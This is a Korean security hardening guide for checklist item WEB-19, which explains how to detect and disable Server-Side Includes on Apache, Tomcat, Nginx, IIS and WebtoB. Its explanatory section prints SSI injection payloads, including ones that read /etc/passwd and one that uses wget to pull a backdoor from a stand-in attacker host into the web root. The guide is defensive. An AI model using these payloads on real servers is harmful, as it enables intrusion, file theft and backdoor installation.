---
title: "[2026 주요정보통신기반시설] WEB-19 웹서비스SSI(ServerSideIncludes)사용제한"
slug: "2026-주정통/WEB-19"
date: 2026-02-05T09:56:13+09:00
lastmod: 2026-02-05T09:56:13+09:00
description: "SSI(Server-Side Includes)는 HTML 페이지에 동적인 콘텐츠를 포함할 수 있는 간단한 서버 사이드 스크립팅 언어입니다. 하지만 SSI는 공격자가 시스템 명령을"
categories: ["가이드라인"]
tags:
  - 2026 주정통 가이드라인
  - Web
---

# WEB-19 웹서비스SSI(ServerSideIncludes)사용제한

## 가이드라인 원문

| 항목 | 내용 |
|------|------|
| **항목코드** | WEB-19 |
| **점검내용** | SSI(Server-Side Includes)는 HTML 페이지에 동적인 콘텐츠를 포함할 수 있는 간단한 서버 사이드 스크립팅 언어입니다. 하지만 SSI는 공격자가 시스템 명령을  |
| **점검대상** | Apache, Tomcat, Nginx, IIS, WebtoB |
| **판단기준** | 양호: 웹서비스 SSI 사용 설정이 비활성화되어 있는 경우 |
| **판단기준** | 취약: 웹서비스 SSI 사용 설정이 활성화되어 있는 경우 |
| **조치방법** | 상세 조치 방법 참고 |

---
---
## 상세 설명

### 1. 항목 개요

SSI(Server-Side Includes)는 HTML 페이지에 동적인 콘텐츠를 포함할 수 있는 간단한 서버 사이드 스크립팅 언어입니다. 하지만 SSI는 공격자가 시스템 명령을 실행하거나 파일을 읽을 수 있는 심각한 보안 취약점이 될 수 있습니다. 현대에는 PHP, JSP, ASP.NET 등 더 안전하고 강력한 기술들이 있으므로 SSI는 사용하지 않는 것이 좋습니다. 마치 집 현관문에 간편하지만 쉽게 뚫릴 수 있는 래치형 잠금장치를 다는 것과 같습니다.

### 2. 왜 이 항목이 필요한가요?

**실제 시나리오:**
- 웹 서버에서 SSI가 활성화되어 있습니다.
- 사용자 입력이 SSI 명령(`<!--#exec cmd="..." -->`)에 포함되어 필터링 없이 페이지에 표시됩니다.
- 공격자가 악의적인 명령을 주입합니다:
  ```html
  <!--#exec cmd="cat /etc/passwd" -->
  <!--#exec cmd="ls -la /" -->
  ```
- 서버는 이 명령을 실행하여 시스템 파일 내용을 노출합니다.

**SSI 공격 위험성:**
- **시스템 명령 실행**: 임의 명령 실행으로 서버 장악
- **파일 노출**: 시스템 파일, 소스 코드 유출
- **정보 탈취**: 환경 변수, 설정 파일 노출
- **서비스 거부**: 무한 루프 등으로 서버 다운

**SSI 취약한 명령 예시:**
```html
<!-- 파일 읽기 -->
<!--#include file="/etc/passwd" -->

<!-- 명령 실행 -->
<!--#exec cmd="cat /etc/passwd" -->
<!--#exec cmd="wget http://attacker.com/backdoor.php -O /var/www/html/" -->

<!-- 환경 변수 -->
<!--#echo var="DATE_GMT" -->
```

### 3. 점검 대상

- **Apache**: Apache HTTP Server
- **Tomcat**: Apache Tomcat 웹 서버
- **Nginx**: Nginx 웹 서버
- **IIS**: Microsoft Internet Information Services
- **WebtoB**: Tmax WebtoB 웹 서버

### 4. 판단 기준

- **양호**: 웹서비스 SSI 사용 설정이 비활성화되어 있는 경우
- **취약**: 웹서비스 SSI 사용 설정이 활성화되어 있는 경우

### 5. 점검 방법

#### Apache

```bash
# Includes 옵션 확인
grep -r "Options.*Includes" /etc/apache2/
```

#### Tomcat

```bash
# SSI 서블릿 확인
grep -r "SSIServlet\|SSIFilter" /<Tomcat 설치 디렉터리>/conf/
```

#### Nginx

```bash
# ssi 옵션 확인
grep -r "ssi on" /<Nginx 설치 디렉터리>/conf/
```

#### IIS

IIS 관리자 > 처리기 매핑에서 `.shtml`, `.shtm`, `.stm` 확인

### 6. 조치 방법

#### Apache

**Step 1) Options 지시자 Includes 옵션 확인**

```bash
vi /<Apache 설치 디렉터리>/conf/httpd.conf (또는 /conf/apache.conf)
```

```apache
<!-- 변경 전 (취약) -->
<Directory />
    Options Includes
</Directory>
```

**Step 2) Options 지시자 Includes 옵션 제거**

```apache
<!-- 변경 후 (양호) -->
<Directory />
    # Options Includes 제거
    Options -Includes
</Directory>
```

**Step 3) Apache 재시작**

```bash
systemctl restart apache2
```

#### Tomcat

**Step 1) web.xml 파일 내 SSI 서블릿 또는 필터 사용 설정 확인**

```bash
cat /<Tomcat 설치 디렉터리>/conf/web.xml | grep 'SSIServlet\|SSIFilter'
```

```xml
<!-- 변경 전 (취약) -->
<servlet-mapping>
    <servlet-name>SSIServlet</servlet-name>
    <url-pattern>*.shtml</url-pattern>
</servlet-mapping>

<filter-mapping>
    <filter-name>SSIFilter</filter-name>
    <url-pattern>*.shtml</url-pattern>
</filter-mapping>
```

**Step 2) web.xml 파일 내 SSI 서블릿 및 필터 설정 삭제 또는 주석 처리**

```bash
vi /<Tomcat 설치 디렉터리>/conf/web.xml
```

```xml
<!-- 변경 후 (양호) - 주석 처리 -->
<!--
<servlet-mapping>
    <servlet-name>SSIServlet</servlet-name>
    <url-pattern>*.shtml</url-pattern>
</servlet-mapping>

<filter-mapping>
    <filter-name>SSIFilter</filter-name>
    <url-pattern>*.shtml</url-pattern>
</filter-mapping>
-->
```

**Step 3) web.xml 파일 내에서 SSI와 관련한 불필요 매핑 제거 또는 주석 처리**

**Step 4) Tomcat 서비스 재구동**

```bash
systemctl restart tomcat
```

#### Nginx

**Step 1) nginx.conf 파일 내 SSI 옵션 사용 여부 확인**

```bash
cat /<Nginx 설치 디렉터리>/conf/nginx.conf
```

```nginx
# 변경 전 (취약)
location / {
    ssi on;
}
```

**Step 2) nginx.conf 파일 내 모든 디렉터리의 SSI 옵션 설정**

```bash
vi /<Nginx 설치 디렉터리>/conf/nginx.conf
```

```nginx
# 변경 후 (양호)
location / {
    ssi off;
}
```

**Step 3) Nginx 재시작**

```bash
systemctl restart nginx
```

#### IIS

**Step 1) 매핑 확장자 확인**

1. 인터넷 정보 서비스(IIS) 관리자 실행
2. 서버 선택 > IIS > '처리기 매핑' 더블클릭
3. `.shtml`, `.shtm`, `.stm` 확장자 매핑 확인 (존재할 경우 취약)

<!-- ![처리기 매핑 확장자 확인](../images/04_웹서비스/image_0021.png) -->

**Step 2) .shtml, .shtm, .stm과 매핑되는 항목 제거**

1. 해당 확장자 선택 후 제거 클릭
2. 확인 클릭

<!-- ![처리기 확장자 삭제](../images/04_웹서비스/image_0022.png) -->

**Step 3) IIS 재시작**

```powershell
iisreset
```

#### WebtoB

**Step 1) http.m 파일 내 SSI 서버 연결 설정 확인**

```bash
vi /<WebtoB 설치 디렉터리>/conf/http.m
```

```text
# 변경 전 (취약)
*SVRGROUP ssig
    NodeName = mynode
    SvrType = SSI

*SERVER ssi
    SvgName = ssig
    MinProc = 10
    MaxProc = 10
```

**Step 2) SSI 서버 설정 삭제**

```text
# 변경 후 (양호) - 주석 처리
#*SVRGROUP ssig
#    NodeName = mynode
#    SvrType = SSI
#
#*SERVER ssi
#    SvgName = ssig
#    MinProc = 10
#    MaxProc = 10
```

**Step 3) 설정 파일 컴파일 및 재구동**

```bash
wscfl -I http.m
wsdown
wsboot
```

### 7. 조치 시 주의사항

- 일반적인 경우 영향이 없습니다.
- SSI를 실제로 사용하는 레거시 페이지가 있는 경우 영향이 있을 수 있습니다.
- `.shtml`, `.shtml` 파일을 사용하는지 확인 후 비활성화하세요.
- 사용자 입력이 SSI 명령에 포함되지 않도록 입력 검증이 필수입니다.
- SSI가 필요한 경우 PHP, JSP 등 더 안전한 대안으로 마이그레이션을 권장합니다.
- 변경 후 해당 확장자의 페이지가 정상 작동하는지 확인해야 합니다.

### 8. 참고 자료

- Apache mod_include: https://httpd.apache.org/docs/current/mod/mod_include.html
- Nginx ngx_http_ssi_module: https://nginx.org/en/docs/http/ngx_http_ssi_module.html
- CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')
- OWASP Server-Side Template Injection: https://owasp.org/www-community/attacks/Server-Side_Template_Injection

## 요약

웹서비스에서 불필요한 SSI 사용을 제한하여 시스템 명령 실행 취약점을 방지하고 서버 보안을 강화해야 합니다.
